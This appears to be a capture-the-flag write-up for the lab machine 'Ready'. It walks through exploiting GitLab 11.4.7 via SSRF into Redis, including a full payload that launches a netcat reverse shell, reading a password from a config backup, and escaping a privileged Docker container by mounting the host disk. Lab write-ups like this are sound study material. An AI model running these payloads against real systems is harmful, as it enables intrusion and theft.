# Ready
IP : 10.10.10.220

## Nmap
Command : 
nmap -A -oN ready.txt 10.10.10.220
Port: 
22/tp 	ssh
5080/tcp http nginx 1.14.2
OS: 
unknown.

## web application 
Version : 
GitLab Commuity Edition v 11.4.7
Vulnerability to RCE via SSRF
https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/

Using the things I learned from "liveoverflow" I learned about crafting a package which can be sent using burb, remeber to create a netcat listener 
````
nc -lvnp 1234
````

````Bash
git://\[0:0:0:0:0:ffff:127.0.0.1\]:6379/ 
 multi
 sadd resque:gitlab:queues system\_hook\_push
 
 lpush resque:gitlab:queue:system\_hook\_push "{\\"class\\":\\"GitlabShellWorker\\",\\"args\\":\[\\"class\_eval\\",\\"open(\\'|nc -e /bin/bash 10.10.16.X 1234\\').read\\"\],\\"retry\\":3,\\"queue\\":\\"system\_hook\_push\\",\\"jid\\":\\"ad52abc5641173e217eb2e52\\",\\"created\_at\\":1513714403.8122594,\\"enqueued\_at\\":1513714403.8129568}" 
 
 exec

 exec 
/ssrf.git
````

Get user flag in /home/dude 

## Root
Emulating we see a backup folder, here we find password to smtp
````bash
cat gitlab.rb | grep password 
````
wW59U!ZKMbG9+*#h
remember to upgrade the shell

````Python 
python3 -c "import pty; pty.spawn('/bin/bash')"
````

## Get root

````bash
su root 
```` 
where the password is one you found in gitlab.rb 

But nothing to be found inside root dir. look like we are in a container. 
by going to /proc/1/cgroup 
We that it a docker container we are inside. 

https://betterprogramming.pub/escaping-docker-privileged-containers-a7ae7d17f5a1?gi=c1a107350323

privileged container check 
````bash
ip link add dummy0 type dummy
````
And it a success meaning we got a priv container

let try escape the container.
````Bash
mkdir /tmp/test
mount /dev/sda2 /tmp/test
cat /tmp/test/root/root.txt
````

And we got root.